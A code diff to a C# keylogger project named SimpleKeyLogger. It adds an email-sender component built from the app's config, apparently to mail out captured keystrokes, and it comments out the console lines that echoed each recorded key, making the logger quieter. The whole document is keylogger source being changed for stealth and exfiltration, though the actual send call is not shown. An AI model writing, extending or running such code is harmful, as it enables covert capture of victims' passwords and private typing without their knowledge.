@@ -1,4 +1,5 @@
 ﻿using Newtonsoft.Json;
+using SimpleKeyLogger.EmailSender;
 using SimpleKeyLogger.FileAdapters;
 using SimpleKeyLogger.Models;
 using System;
@@ -22,6 +23,7 @@ namespace SimpleKeyLogger
         {
             string configText = File.ReadAllText("AppConfig.json");
             AppConfig config = JsonConvert.DeserializeObject<AppConfig>(configText);
+            LoggerEmailSender sender = new LoggerEmailSender(config);
             bool endOfProgram = false;
             TextFileAdapter file = new TextFileAdapter("log", "");
             List<int> charSet = new List<int>();
@@ -45,13 +47,13 @@ namespace SimpleKeyLogger
 
                         if (i >= 96 && i <= 105)
                         {
-                            Console.WriteLine((char)(i - 48));
+                            //Console.WriteLine((char)(i - 48));
                             file.WriteToFile(((char)(i - 48)).ToString());
                         }
                         else if (i == 27) endOfProgram = true;
                         else
                         {
-                            Console.WriteLine((char)i);
+                            //Console.WriteLine((char)i);
                             file.WriteToFile(((char)i).ToString());
                         }
 
